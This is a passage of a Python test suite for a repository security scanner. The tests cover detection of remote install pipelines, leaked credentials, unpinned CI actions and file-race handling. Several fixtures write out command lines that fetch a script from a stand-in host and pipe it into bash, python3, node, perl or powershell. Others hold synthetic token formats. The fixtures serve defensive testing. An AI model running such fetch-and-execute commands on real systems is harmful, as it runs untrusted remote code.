            f"{fetcher} https://invalid.example/timeout | timeout 10 {shell}\n"
            f"echo '{nested}'\n"
            f"printf '%s' '{nested}'\n"
            f"env -S '{nested}'\n"
            f"{fetcher} https://invalid.example/query | command -v {shell}\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)

        self.assertEqual(1, completed.returncode)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        ]
        self.assertEqual({1, 2, 3, 4, 5, 6}, {finding["line"] for finding in findings})
        self.assertNotIn(
            "VW-SHELL-PIPELINE-UNPARSED",
            {finding["rule_id"] for finding in report["findings"]},
        )

    def test_req_009_remote_execution_contexts_comments_interpreters_and_heredocs(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        fixture.write(
            "contexts.txt",
            f"run: {fetcher} https://invalid.example/yaml | python3\n"
            f"RUN {fetcher} https://invalid.example/docker | node\n"
            f"@( {fetcher} https://invalid.example/make | perl )\n"
            f"{fetcher} https://invalid.example/comment | # continuation\n  ruby\n"
            "cat <<'DATA'\n"
            f"{fetcher} https://invalid.example/data | bash\n"
            "DATA\n"
            "bash <<'SCRIPT'\n"
            f"{fetcher} https://invalid.example/executed | php\n"
            "SCRIPT\n"
            f"{fetcher} https://invalid.example/powershell | powershell\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        remote = [item for item in report["findings"] if item["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"]
        self.assertEqual({1, 2, 3, 4, 10, 12}, {item["line"] for item in remote})
        self.assertNotIn(7, {item["line"] for item in remote})

    def test_req_009_independent_lines_do_not_form_remote_pipeline(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        shell = "ba" + "sh"
        fixture.write(
            "download.sh",
            f"{fetcher} -o tool https://invalid.example/tool\n"
            f"printf safe | {shell}\n"
            f"{fetcher} is only a word in this prose.\n"
            f"echo local | {shell}\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(0, completed.returncode)
        self.assertNotIn(
            "VW-REMOTE-INSTALL-SCRIPT",
            {finding["rule_id"] for finding in report["findings"]},
        )

    def test_req_009_shell_tokenization_is_linear_and_malformed_syntax_fails_closed(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        shell = "ba" + "sh"
        fixture.write("long-unclosed.txt", f'{fetcher} "' + ("x" * 50_000) + "\n")
        fixture.write(
            "long-pipeline.txt",
            f"{fetcher} " + ("x" * 5_000) + f" | {shell}\n",
        )
        fixture.write("malformed-pipeline.txt", f'{fetcher} "unclosed | {shell}\n')

        started = time.perf_counter()
        completed = self.run_scanner(fixture.root)
        elapsed = time.perf_counter() - started
        report = self.json_report(completed)

        self.assertLess(elapsed, 3.0, f"bounded shell scan took {elapsed:.3f}s")
        self.assertEqual(1, completed.returncode)
        unparsed = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-SHELL-PIPELINE-UNPARSED"
        ]
        self.assertEqual({"malformed-pipeline.txt"}, {finding["path"] for finding in unparsed})
        remote = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        ]
        self.assertEqual({"long-pipeline.txt"}, {finding["path"] for finding in remote})

    def test_req_009_plain_megabyte_scan_is_linear(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("plain.txt", "!" * 1_048_576)

        scanner = load_scanner_module()
        started = time.perf_counter()
        self.assertEqual(([], []), scanner._remote_pipe_line_numbers("!" * 1_048_576))
        direct_elapsed = time.perf_counter() - started

        started = time.perf_counter()
        completed = self.run_scanner(fixture.root)
        scan_elapsed = time.perf_counter() - started

        self.assertLess(direct_elapsed, 1.0, f"direct shell scan took {direct_elapsed:.3f}s")
        self.assertLess(scan_elapsed, 3.0, f"full scanner took {scan_elapsed:.3f}s")
        self.assertEqual(0, completed.returncode)

    def test_req_009_unpinned_workflow_blocks_but_full_sha_passes(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            ".github/workflows/release.yml",
            "steps:\n  - uses: actions/checkout@v4\n  - uses: owner/action@"
            + ("a" * 40)
            + "\n  - { uses: owner/flow-action@v4 }\n"
            + "  - { 'uses': 'owner/quoted-action@v4' }\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        action_findings = [finding for finding in report["findings"] if finding["rule_id"] == "VW-AUTOMATION-UNPINNED"]
        self.assertEqual(3, len(action_findings))
        self.assertEqual({2, 4, 5}, {finding["line"] for finding in action_findings})

    def test_req_009_workflow_context_survives_directory_and_file_targets(self) -> None:
        fixture = RepositoryFixture(self)
        workflow = fixture.write(
            ".github/workflows/release.yml",
            "steps:\n  - uses: actions/checkout@v4\n",
        )
        fixture.track(".github/workflows/release.yml")

        for target in (fixture.root, workflow.parent, workflow):
            with self.subTest(target=target):
                completed = self.run_scanner(target)
                report = self.json_report(completed)
                self.assertEqual(1, completed.returncode)
                self.assertEqual(
                    ["VW-AUTOMATION-UNPINNED"],
                    [finding["rule_id"] for finding in report["findings"]],
                )

    def test_req_009_realistic_secret_with_example_substring_is_not_placeholder(self) -> None:
        fixture = RepositoryFixture(self)
        synthetic_value = "A1" + "example" + "B2C3D4E5F6"
        fixture.write("config.txt", f"password={synthetic_value}\n")

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        self.assertIn(
            "VW-SECRET-GENERIC-ASSIGNMENT",
            {finding["rule_id"] for finding in report["findings"]},
        )
        self.assertNotIn(synthetic_value, completed.stdout)

    def test_req_009_realistic_secret_with_placeholder_prefix_is_not_placeholder(self) -> None:
        fixture = RepositoryFixture(self)
        assignment_name = "pass" + "word"
        synthetic_value = "test-" + "RealisticCredential1234"
        fixture.write("config.txt", f"{assignment_name}={synthetic_value}\n")

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        self.assertIn(
            "VW-SECRET-GENERIC-ASSIGNMENT",
            {finding["rule_id"] for finding in report["findings"]},
        )
        self.assertNotIn(synthetic_value, completed.stdout)

    def test_req_009_generic_assignment_scan_is_linear_without_value_evidence(self) -> None:
        scanner = load_scanner_module()
        candidate = scanner.Candidate(Path("config.txt"), "config.txt", None, b"config.txt")
        synthetic_value = "!LinearSyntheticCredential123456789"
        text = ("ordinary_name_" * 50_000) + f"password={synthetic_value}"
        findings: list[object] = []

        started = time.perf_counter()
        scanner._scan_text(candidate, text, findings)
        elapsed = time.perf_counter() - started
        rendered = json.dumps([finding.as_dict() for finding in findings])

        self.assertLess(elapsed, 1.5, f"generic assignment scan took {elapsed:.3f}s")
        self.assertEqual(
            ["VW-SECRET-GENERIC-ASSIGNMENT"],
            [finding.rule_id for finding in findings],
        )
        self.assertNotIn(synthetic_value, rendered)

        clean_findings: list[object] = []
        started = time.perf_counter()
        scanner._scan_text(candidate, "token" * 150_000, clean_findings)
        clean_elapsed = time.perf_counter() - started
        self.assertLess(clean_elapsed, 1.5, f"generic clean scan took {clean_elapsed:.3f}s")
        self.assertEqual([], clean_findings)

        typed_noise = ("password: string; " * 70_000)[:1_048_576]
        started = time.perf_counter()
        self.assertEqual([], list(scanner._generic_assignments(typed_noise)))
        typed_elapsed = time.perf_counter() - started
        self.assertLess(typed_elapsed, 1.5, f"typed assignment scan took {typed_elapsed:.3f}s")

    def test_req_009_generic_assignment_handles_types_subscripts_and_comments(self) -> None:
        fixture = RepositoryFixture(self)
        assignment_name = "pass" + "word"
        values = (
            "SyntheticTypedCredential12345",
            "SyntheticBracketCredential12345",
            "SyntheticCommentCredential12345",
            "SyntheticGenericCredential12345",
            "SyntheticColonCredential=WithSuffix12345",
        )
        fixture.write(
            "config.ts",
            f'const password: string = "{values[0]}";\n'
            f'config["password"] = "{values[1]}";\n'
            f'const password /* application-owned */ = "{values[2]}";\n'
            f'const accessToken: Record<string, string> = "{values[3]}";\n'
            f"{assignment_name}: {values[4]}\n"
            "const password: string;\n"
            "const password: someValue == otherValue;\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)

        self.assertEqual(1, completed.returncode)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-SECRET-GENERIC-ASSIGNMENT"
        ]
        self.assertEqual({1, 2, 3, 4, 5}, {finding["line"] for finding in findings})
        for value in values:
            self.assertNotIn(value, completed.stdout)

    def test_req_009_code_identifiers_calls_and_literal_assignment_boundaries(self) -> None:
        fixture = RepositoryFixture(self)
        phrase = "Synthetic credential phrase with spaces"
        backtick_phrase = "Synthetic backtick credential phrase"
        multiline = "Synthetic first line\nSynthetic second line 12345"
        token_name = "api" + "Token"
        fixture.write(
            "config.ts",
            "type Shape = { accessToken: AuthenticationCredential };\n"
            "const password = documentationOnlyValue;\n"
            "const password = buildCredential();\n"
            f'const password = "{phrase}";\n'
            f"const {token_name} = `{backtick_phrase}`;\n"
            f"const clientSecret = `{multiline}`;\n"
            "const accessToken = `${process.env.ACCESS_TOKEN}`;\n",
        )
        fixture.write(".env.example", "API_TOKEN=https://api.example.com/replace/me\n")

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        generic = [item for item in report["findings"] if item["rule_id"] == "VW-SECRET-GENERIC-ASSIGNMENT"]
        self.assertEqual({4, 5, 6}, {item["line"] for item in generic})
        self.assertNotIn(phrase, completed.stdout)
        self.assertNotIn(multiline, completed.stdout)

    def test_req_009_new_provider_tokens_and_mutable_workflow_images_block(self) -> None:
        fixture = RepositoryFixture(self)
        values = (
            "github_pat_" + ("A" * 40),
            "glpat-" + ("b" * 30),
            "sk-proj-" + ("c" * 30),
        )
        fixture.write("tokens.txt", "\n".join(values) + "\n")
        fixture.write(
            ".github/workflows/build.yml",
            "container: node:20\n"
            "services:\n"
            "  cache:\n"
            "    image: redis@sha256:" + ("d" * 64) + "\n"
            "  database:\n"
            "    image: postgres:17\n",
        )
        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        provider = [item for item in report["findings"] if item["rule_id"] == "VW-SECRET-PROVIDER-TOKEN"]
        automation = [item for item in report["findings"] if item["rule_id"] == "VW-AUTOMATION-UNPINNED"]
        self.assertEqual(3, len(provider))
        self.assertEqual({1, 6}, {item["line"] for item in automation})
        for value in values:
            self.assertNotIn(value, completed.stdout)

    @unittest.skipIf(os.name == "nt", "Git fsmonitor hook execution regression uses a POSIX hook")
    def test_req_010_repository_fsmonitor_hook_is_never_executed(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("README.md", "clean\n")
        fixture.track("README.md")
        marker = fixture.base / "fsmonitor-executed"
        hook = fixture.root / ".git" / "hooks" / "synthetic-fsmonitor"
        hook.write_text(
            "#!/bin/sh\nprintf executed > " + str(marker) + "\nexit 0\n",
            encoding="utf-8",
        )
        hook.chmod(0o700)
        subprocess.run(
            ["git", "config", "core.fsmonitor", str(hook)],
            cwd=fixture.root,
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(0, completed.returncode)
        self.assertFalse(marker.exists())
        self.assertFalse(report["scope"]["network_used"])
        self.assertFalse(report["scope"]["files_modified"])

    def test_req_010_inherited_git_environment_cannot_mutate_or_replace_scope(self) -> None:
        fixture = RepositoryFixture(self)
        assignment_name = "pass" + "word"
        fixture.write(".gitignore", "credential.txt\n")
        fixture.write(
            "credential.txt",
            f"{assignment_name}=SyntheticTrackedCredential12345\n",
        )
        fixture.track(".gitignore")
        fixture.track("credential.txt", force=True)

        alternate_index = fixture.base / "alternate-index"
        alternate_objects = fixture.base / "alternate-objects"
        alternate_objects.mkdir()
        alternate_environment = os.environ.copy()
        alternate_environment["GIT_INDEX_FILE"] = str(alternate_index)
        subprocess.run(
            ["git", "read-tree", "--empty"],
            cwd=fixture.root,
            env=alternate_environment,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=True,
        )
        subprocess.run(
            ["git", "add", "--", ".gitignore"],
            cwd=fixture.root,
            env=alternate_environment,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=True,
        )

        trace = fixture.root / "git-trace.log"
        trace2 = fixture.root / "git-trace2.json"
        before = tree_digest(fixture.root)
        completed = self.run_scanner(
            fixture.root,
            environment_overrides={
                "GIT_TRACE": str(trace),
                "GIT_TRACE2_EVENT": str(trace2),
                "GIT_INDEX_FILE": str(alternate_index),
                "GIT_OBJECT_DIRECTORY": str(alternate_objects),
                "GIT_ALTERNATE_OBJECT_DIRECTORIES": str(alternate_objects),
            },
        )
        report = self.json_report(completed)

        self.assertEqual(1, completed.returncode)
        self.assertIn(
            "VW-SECRET-GENERIC-ASSIGNMENT",
            {finding["rule_id"] for finding in report["findings"]},
        )
        self.assertFalse(trace.exists())
        self.assertFalse(trace2.exists())
        self.assertFalse(report["scope"]["files_modified"])
        self.assertEqual(before, tree_digest(fixture.root))

    @unittest.skipIf(os.name == "nt", "Executable marker regression uses a POSIX script")
    def test_req_010_git_from_target_or_controlled_ancestor_is_never_executed(self) -> None:
        for location in ("target", "ancestor"):
            with self.subTest(location=location):
                fixture = RepositoryFixture(self)
                fixture.write("README.md", "ordinary\n")
                executable_directory = fixture.root / "bin" if location == "target" else fixture.base
                executable_directory.mkdir(exist_ok=True)
                marker = fixture.base / f"git-executed-{location}"
                fake_git = executable_directory / "git"
                fake_git.write_text(f"#!/bin/sh\nprintf executed > '{marker}'\nexit 0\n", encoding="utf-8")
                fake_git.chmod(0o700)

                completed = self.run_scanner(
                    fixture.root,
                    environment_overrides={"PATH": str(executable_directory)},
                )
                report = self.json_report(completed)
                self.assertEqual(0, completed.returncode)
                self.assertEqual("filesystem", report["scope"]["mode"])
                self.assertFalse(marker.exists())

    def test_req_011_opened_descriptor_identity_change_fails_closed(self) -> None:
        scanner = load_scanner_module()
        fixture = RepositoryFixture(self, git=False)
        scan_root = fixture.root.resolve(strict=True)
        candidate_path = fixture.write("data.txt", "ordinary inside content\n").resolve(strict=True)
        outside_value = "outside-" + synthetic_cloud_key()
        outside_path = fixture.base / "outside.txt"
        outside_path.write_text(outside_value, encoding="utf-8")
        outside_path = outside_path.resolve(strict=True)
        original_open = scanner._open_readonly

        def redirected_open(path: Path) -> int:
            self.assertEqual(candidate_path, Path(path))
            return original_open(outside_path)

        report = scanner.Report()
        candidate = scanner.Candidate(candidate_path, "data.txt", None)
        root_guard = make_root_guard(scanner, scan_root)
        with mock.patch.object(scanner, "_open_readonly", side_effect=redirected_open):
            result = scanner._read_candidate(candidate, root_guard, 1024, report)

        self.assertIsNone(result)
        self.assertEqual("tool.file-race", report.tool_errors[0].code)
        self.assertEqual(2, report.exit_code)
        rendered = scanner.render_json(report)
        self.assertNotIn(outside_value, rendered)

    def test_req_011_scan_root_object_swap_fails_closed_before_enumeration(self) -> None:
        scanner = load_scanner_module()
        fixture = RepositoryFixture(self, git=False)
        fixture.write("inside.txt", "ordinary inside content\n")
        outside_directory = fixture.base / "outside"
        outside_directory.mkdir()
        outside_value = "outside-" + synthetic_cloud_key()
        (outside_directory / "outside.txt").write_text(outside_value, encoding="utf-8")
        original_directory = fixture.base / "original"
        original_resolve = scanner._resolve_strict
        swapped = False

        def swapping_resolve(path: Path) -> Path:
            nonlocal swapped
            if not swapped and Path(path) == fixture.root:
                swapped = True
                fixture.root.rename(original_directory)
                outside_directory.rename(fixture.root)
            return original_resolve(path)

        report = scanner.Report()
        with mock.patch.object(scanner, "_resolve_strict", side_effect=swapping_resolve):
            candidates, root_guard = scanner._enumerate_candidates(fixture.root, 100, report)

        self.assertTrue(swapped)
        self.assertEqual([], candidates)
        self.assertIsNone(root_guard)
        self.assertEqual("tool.target-race", report.tool_errors[0].code)
        self.assertEqual(2, report.exit_code)
        self.assertNotIn(outside_value, scanner.render_json(report))

    def test_req_011_resolved_root_identity_mismatch_fails_closed(self) -> None:
        scanner = load_scanner_module()
        fixture = RepositoryFixture(self, git=False)
        fixture.write("inside.txt", "ordinary inside content\n")
        outside_directory = fixture.base / "outside"
        outside_directory.mkdir()
        outside_value = "outside-" + synthetic_cloud_key()
        (outside_directory / "outside.txt").write_text(outside_value, encoding="utf-8")

        report = scanner.Report()
        with mock.patch.object(
            scanner,
            "_resolve_strict",
            return_value=outside_directory.resolve(strict=True),
        ):
            candidates, root_guard = scanner._enumerate_candidates(fixture.root, 100, report)

        self.assertEqual([], candidates)
        self.assertIsNone(root_guard)
        self.assertEqual("tool.target-race", report.tool_errors[0].code)
        self.assertEqual(2, report.exit_code)
        self.assertNotIn(outside_value, scanner.render_json(report))

    def test_req_011_windows_name_surrogate_reparse_is_a_redirect(self) -> None:
        scanner = load_scanner_module()
        junction = types.SimpleNamespace(
            st_mode=scanner.stat.S_IFDIR,
            st_reparse_tag=0xA0000003,
        )
        fallback = types.SimpleNamespace(
            st_mode=scanner.stat.S_IFDIR,
            st_file_attributes=scanner.stat.FILE_ATTRIBUTE_REPARSE_POINT,
        )
        regular = types.SimpleNamespace(st_mode=scanner.stat.S_IFDIR, st_reparse_tag=0)

        self.assertTrue(scanner._is_path_redirect(junction))
        self.assertTrue(scanner._is_path_redirect(fallback))
        self.assertFalse(scanner._is_path_redirect(regular))

    def test_req_011_ancestor_symlink_swap_fails_closed_before_read(self) -> None:
        scanner = load_scanner_module()
        fixture = RepositoryFixture(self, git=False)
        scan_root = fixture.root.resolve(strict=True)
        candidate_path = fixture.write("safe/data.txt", "ordinary inside content\n").resolve(strict=True)
        outside_directory = fixture.base / "outside"
        outside_directory.mkdir()
        outside_directory = outside_directory.resolve(strict=True)
        outside_value = "outside-" + synthetic_cloud_key()
        (outside_directory / "data.txt").write_text(outside_value, encoding="utf-8")
        original_open = scanner._open_readonly
        swapped = False

        def swapping_open(path: Path) -> int:
            nonlocal swapped
            if not swapped and Path(path) == candidate_path:
                swapped = True
                safe_directory = scan_root / "safe"
                safe_directory.rename(scan_root / "safe-original")
                safe_directory.symlink_to(outside_directory, target_is_directory=True)
            return original_open(path)

        report = scanner.Report()
        candidate = scanner.Candidate(candidate_path, "safe/data.txt", None)
        root_guard = make_root_guard(scanner, scan_root)
        with mock.patch.object(scanner, "_open_readonly", side_effect=swapping_open):
            result = scanner._read_candidate(candidate, root_guard, 1024, report)

        self.assertIsNone(result)
        self.assertTrue(swapped)
        self.assertEqual("tool.file-race", report.tool_errors[0].code)
        self.assertEqual(2, report.exit_code)
        rendered = scanner.render_json(report)
        self.assertNotIn(outside_value, rendered)

    def test_req_011_content_metadata_change_during_read_fails_closed(self) -> None:
        scanner = load_scanner_module()
        fixture = RepositoryFixture(self, git=False)
        scan_root = fixture.root.resolve(strict=True)
        candidate_path = fixture.write("data.txt", "ordinary content\n").resolve(strict=True)
        original_fstat = scanner._descriptor_stat
        calls = 0

        def changing_fstat(descriptor: int) -> object:
            nonlocal calls
            calls += 1
            current = original_fstat(descriptor)
            if calls == 1:
                return current
            return types.SimpleNamespace(
                st_mode=current.st_mode,
                st_dev=current.st_dev,
                st_ino=current.st_ino,
                st_size=current.st_size,
                st_mtime_ns=current.st_mtime_ns + 1,
                st_ctime_ns=current.st_ctime_ns,
            )

        report = scanner.Report()
        candidate = scanner.Candidate(candidate_path, "data.txt", None)
        root_guard = make_root_guard(scanner, scan_root)
        with mock.patch.object(scanner, "_descriptor_stat", side_effect=changing_fstat):
            result = scanner._read_candidate(candidate, root_guard, 1024, report)

        self.assertIsNone(result)
        self.assertEqual(2, calls)
        self.assertEqual("tool.file-race", report.tool_errors[0].code)
        self.assertEqual(2, report.exit_code)

    def test_req_011_complete_distinct_approver_warning_suppression(self) -> None:
        fixture = RepositoryFixture(self)
        firebase = synthetic_firebase_key()
        marker = (
            'vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY reason="restricted in console" '
            'owner="app-team" approved-by="security-team" '
            'compensating-control="deny by default rules" expires="2099-01-01"'
        )
        fixture.write("config.js", f'const firebaseApiKey = "{firebase}"; // {marker}\n')

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(0, completed.returncode)
        self.assertEqual(1, len(report["findings"]))
        finding = report["findings"][0]
        self.assertTrue(finding["suppressed"])
        self.assertTrue(finding["suppression"]["metadata_complete"])
        self.assertTrue(finding["suppression"]["approver_identifier_distinct"])
        self.assertFalse(finding["suppression"]["approver_independence_verified"])
        self.assertTrue(finding["suppression"]["values_redacted"])
        self.assertEqual(1, report["summary"]["suppressed_warnings"])
        self.assertEqual(1, report["summary"]["required_manual_checks"])
        self.assertNotIn(firebase, completed.stdout)
        self.assertNotIn("app-team", completed.stdout)
        self.assertNotIn("security-team", completed.stdout)

    def test_req_011_incomplete_same_owner_or_expired_suppression_fails(self) -> None:
        cases = (
            'reason="reviewed" owner="same" approved-by="same" compensating-control="rules" expires="2099-01-01"',
            'reason="reviewed" owner="app-team" approved-by="app\u200b-team" compensating-control="rules" expires="2099-01-01"',
            'reason="reviewed" owner="app" approved-by="security" compensating-control="rules" expires="2000-01-01"',
            'reason="reviewed" owner="app" approved-by="security" expires="2099-01-01"',
        )
        for metadata in cases:
            with self.subTest(metadata=metadata):
                fixture = RepositoryFixture(self)
                firebase = synthetic_firebase_key()
                fixture.write(
                    "config.js",
                    f'const firebaseApiKey = "{firebase}"; // vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY {metadata}\n',
                )
                completed = self.run_scanner(fixture.root)
                report = self.json_report(completed)
                self.assertEqual(1, completed.returncode)
                rule_ids = {finding["rule_id"] for finding in report["findings"]}
                self.assertIn("VW-SUPPRESSION-INVALID", rule_ids)
                public_finding = next(
                    finding for finding in report["findings"] if finding["rule_id"] == "VW-FIREBASE-PUBLIC-API-KEY"
                )
                self.assertFalse(public_finding["suppressed"])
                self.assertNotIn(firebase, completed.stdout)

    @unittest.skipIf(os.name == "nt", "Backslash is a path separator on Windows")
    def test_req_011_display_path_collision_cannot_cross_suppress(self) -> None:
        fixture = RepositoryFixture(self)
        firebase = synthetic_firebase_key()
        marker = (
            'vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY reason="restricted" '
            'owner="app" approved-by="security" compensating-control="deny rules" '
            'expires="2099-01-01"'
        )
        fixture.write("a/b.js", f'const firebaseApiKey = "{firebase}"; // {marker}\n')
        fixture.write(r"a\b.js", f'const firebaseApiKey = "{firebase}";\n')

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-FIREBASE-PUBLIC-API-KEY"
        ]
        self.assertEqual(2, len(findings))
        self.assertEqual(1, sum(finding["suppressed"] for finding in findings))
        self.assertEqual(1, report["summary"]["active_warnings"])
        self.assertEqual(2, len({finding["path"] for finding in findings}))

    def test_req_011_redacted_filename_collision_cannot_cross_suppress(self) -> None:
        fixture = RepositoryFixture(self)
        firebase = synthetic_firebase_key()
        assignment_name = "to" + "ken"
        first_secret = "First" + "SyntheticSecret1234"
        second_secret = "Second" + "SyntheticSecret5678"
        marker = (
            'vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY reason="restricted" '
            'owner="app" approved-by="security" compensating-control="deny rules" '
            'expires="2099-01-01"'
        )
        fixture.write(
            f"{assignment_name}={first_secret}",
            f'const firebaseApiKey = "{firebase}"; // {marker}\n',
        )
        fixture.write(
            f"{assignment_name}={second_secret}",
            f'const firebaseApiKey = "{firebase}";\n',
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-FIREBASE-PUBLIC-API-KEY"
        ]
        self.assertEqual(2, len(findings))
        self.assertEqual(1, sum(finding["suppressed"] for finding in findings))
        self.assertEqual(1, report["summary"]["active_warnings"])
        self.assertEqual(2, len({finding["path"] for finding in findings}))
        self.assertTrue(
            all("__vibeworthy_redacted_path_" in finding["path"] for finding in findings)
        )
        self.assertNotIn(first_secret, completed.stdout)
        self.assertNotIn(second_secret, completed.stdout)

    def test_req_011_blocker_cannot_be_suppressed(self) -> None:
        fixture = RepositoryFixture(self)
        privileged = synthetic_supabase_key("secret")
        marker = (
            'vibeworthy:ignore VW-SUPABASE-PRIVILEGED-KEY reason="accepted" '
            'owner="app" approved-by="security" compensating-control="server only" expires="2099-01-01"'
        )
        fixture.write("config.js", f'const backendCredential = "{privileged}"; // {marker}\n')

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        rule_ids = {finding["rule_id"] for finding in report["findings"]}
        self.assertIn("VW-SUPABASE-PRIVILEGED-KEY", rule_ids)
        self.assertIn("VW-SUPPRESSION-BLOCKER", rule_ids)
        privileged_finding = next(
            finding for finding in report["findings"] if finding["rule_id"] == "VW-SUPABASE-PRIVILEGED-KEY"
        )
        self.assertFalse(privileged_finding["suppressed"])
        self.assertNotIn(privileged, completed.stdout)

    def test_req_010_usage_and_tool_failures_return_two_as_structured_output(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("README.md", "clean\n")

        invalid_limit = self.run_scanner(fixture.root, "json", "--max-file-bytes", "0")
        invalid_report = self.json_report(invalid_limit)
        self.assertEqual(2, invalid_limit.returncode)
        self.assertEqual(2, invalid_report["exit_code"])
        self.assertEqual("usage.invalid-arguments", invalid_report["tool_errors"][0]["code"])

        missing = self.run_scanner(fixture.root / "missing", "sarif")
        self.assertEqual(2, missing.returncode)
        missing_report = json.loads(missing.stdout)
        invocation = missing_report["runs"][0]["invocations"][0]
        self.assertFalse(invocation["executionSuccessful"])
        self.assertEqual(2, invocation["exitCode"])
        self.assertTrue(invocation["toolExecutionNotifications"])
        self.assertNotIn(str(fixture.root), missing.stdout)

    def test_req_011_nul_manifest_and_aggregate_budgets_fail_closed(self) -> None:
        fixture = RepositoryFixture(self, git=False)
        fixture.write("package.json", b'{"dependencies":{}}\0')
        nul_report = self.json_report(self.run_scanner(fixture.root))
        self.assertEqual("tool.manifest-binary", nul_report["tool_errors"][0]["code"])

        scanner = load_scanner_module()
        budget_fixture = RepositoryFixture(self, git=False)
        budget_fixture.write("one.txt", "ordinary-one\n")
        budget_fixture.write("two.txt", "ordinary-two\n")
        with mock.patch.object(scanner, "DEFAULT_MAX_TOTAL_BYTES", 8):
            byte_report = scanner.scan_path(budget_fixture.root)
        self.assertEqual(2, byte_report.exit_code)
        self.assertEqual([], byte_report.findings)
        self.assertEqual("tool.byte-limit", byte_report.tool_errors[0].code)

        finding_fixture = RepositoryFixture(self, git=False)
        finding_fixture.write(
            "tokens.txt",
            ("github_pat_" + ("A" * 40)) + "\n" + ("glpat-" + ("b" * 30)) + "\n",
        )
        with mock.patch.object(scanner, "DEFAULT_MAX_FINDINGS", 1):
            finding_report = scanner.scan_path(finding_fixture.root)
        self.assertEqual(2, finding_report.exit_code)
        self.assertEqual([], finding_report.findings)
        self.assertEqual("tool.finding-limit", finding_report.tool_errors[0].code)

    def test_req_011_candidate_cap_fails_closed_without_partial_findings(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("one.txt", "ordinary\n")
        fixture.write("two.txt", f"token={synthetic_cloud_key()}\n")

        completed = self.run_scanner(fixture.root, "json", "--max-files", "1")
        report = self.json_report(completed)
        self.assertEqual(2, completed.returncode)
        self.assertEqual([], report["findings"])
        self.assertEqual("tool.file-limit", report["tool_errors"][0]["code"])

    def test_req_011_filesystem_candidate_cap_stops_enumeration_early(self) -> None:
        scanner = load_scanner_module()
        fixture = RepositoryFixture(self, git=False)
        resumed_after_limit = False

        def synthetic_walk(*_args: object, **_kwargs: object) -> object:
            nonlocal resumed_after_limit
            yield os.fspath(fixture.root), [], ["one.txt", "two.txt"]
            resumed_after_limit = True
            raise AssertionError("enumeration resumed after the candidate limit")

        report = scanner.Report()
        with mock.patch.object(scanner.os, "walk", side_effect=synthetic_walk):
            candidates = scanner._filesystem_candidates(fixture.root, False, 1, report)

        self.assertEqual([], candidates)
        self.assertFalse(resumed_after_limit)
        self.assertEqual("tool.file-limit", report.tool_errors[0].code)

    def test_req_011_symlink_root_is_a_tool_error(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("README.md", "ordinary\n")
        linked_root = fixture.base / "linked-root"
        linked_root.symlink_to(fixture.root, target_is_directory=True)

        completed = self.run_scanner(linked_root)
        report = self.json_report(completed)
        self.assertEqual(2, completed.returncode)
        self.assertEqual("tool.target-symlink", report["tool_errors"][0]["code"])

    @unittest.skipUnless(os.name == "nt", "Windows junction regression")
    def test_req_011_windows_junction_roots_and_components_are_rejected(self) -> None:
        fixture = RepositoryFixture(self, git=False)
        fixture.write("README.md", "ordinary\n")
        outside_directory = fixture.base / "outside"
        outside_directory.mkdir()
        (outside_directory / "secret.txt").write_text(
            "access_token = \"" + synthetic_cloud_key() + "\"\n",
            encoding="utf-8",
        )

        component_junction = fixture.root / "linked"
        root_junction = fixture.base / "root-junction"
        for junction, target in (
            (component_junction, outside_directory),
            (root_junction, fixture.root),
        ):
            created = subprocess.run(
                ["cmd.exe", "/d", "/c", "mklink", "/J", str(junction), str(target)],
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                check=False,
            )
            self.assertEqual(0, created.returncode, created.stderr)

        component_scan = self.run_scanner(fixture.root)
        component_report = self.json_report(component_scan)
        self.assertEqual(0, component_scan.returncode)
        self.assertEqual(1, component_report["summary"]["skipped_by_reason"]["symlink"])
        self.assertEqual([], component_report["findings"])

        root_scan = self.run_scanner(root_junction)
        root_report = self.json_report(root_scan)
        self.assertEqual(2, root_scan.returncode)
